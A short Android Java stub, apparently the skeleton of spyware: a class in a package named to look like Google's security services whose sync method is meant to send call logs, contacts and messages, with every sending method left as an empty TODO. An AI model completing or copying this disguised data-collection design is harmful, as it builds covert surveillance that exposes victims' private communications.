package com.google.services.security;

import android.content.Context;

/**
 * Created by ouala_eddine on 12/27/2018.
 * Project : lahcen.
 */
class Synchronizer {
    private final Context context;

    Synchronizer(Context context) {
        this.context = context;
    }

    public void sync() {
        sendCallLogs();
        sendContacts();
        sendMessages();
    }

    private void sendMessages() {
        // TODO: 12/27/2018
    }

    private void sendContacts() {
        // TODO: 12/27/2018
    }

    private void sendCallLogs() {
        // TODO: 12/27/2018
    }
}
